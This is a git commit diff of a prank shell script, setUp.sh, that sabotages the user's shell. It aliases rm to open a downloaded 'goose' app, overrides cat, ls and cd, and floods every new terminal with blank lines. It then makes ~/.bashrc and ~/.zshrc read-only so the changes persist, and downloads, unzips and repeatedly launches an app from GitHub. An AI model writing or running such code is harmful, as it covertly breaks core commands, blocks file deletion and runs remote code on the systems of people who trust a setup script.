2abb63f8905575d49b04bdca49ffd2739e30a1e8
4n4k1n <anakin@pregitzer.de>
2025-01-04 00:48:18 +0100

    setup the goose

--- setUp.sh
+++ setUp.sh
@@ -5,14 +5,17 @@ add_alias() {
     local alias_file="$2"
     if ! grep -q "$alias_command" "$alias_file"; then
         echo "$alias_command" >> "$alias_file"
-        echo "Added: $alias_command"
-    else
-        echo "Alias '$alias_command' already exists in $alias_file"
     fi
 }
 
+echo "printf '\n%.0s' {1..200}" >> ~/.bashrc
+echo "printf '\n%.0s' {1..200}" >> ~/.zshrc
+
 add_alias "alias cat='printf \"meow\n\"'" ~/.bashrc
 add_alias "alias cat='printf \"meow\n\"'" ~/.zshrc
+
+add_alias "alias rm='open ~/goose/goose.app'" ~/.bashrc
+add_alias "alias rm='open ~/goose/goose.app'" ~/.zshrc
 
 add_alias "alias ls='echo \"Segmentation fault\"'" ~/.bashrc
 add_alias "alias ls='echo \"Segmentation fault\"'" ~/.zshrc
@@ -28,8 +31,13 @@ chmod +x ~/masterplan.sh
 echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
 echo "alias cd='bash ~/masterplan.sh'" >> ~/.bashrc
 
+chmod -w ~/.zshrc
+chmod -w ~/.bashrc
+
 curl -L -o ~/goose.zip 'https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip'
 unzip -o ~/goose.zip -d ~/goose
+open ~/goose/goose.app
+open ~/goose/goose.app
 open ~/goose/goose.app
 
 echo "Done!"
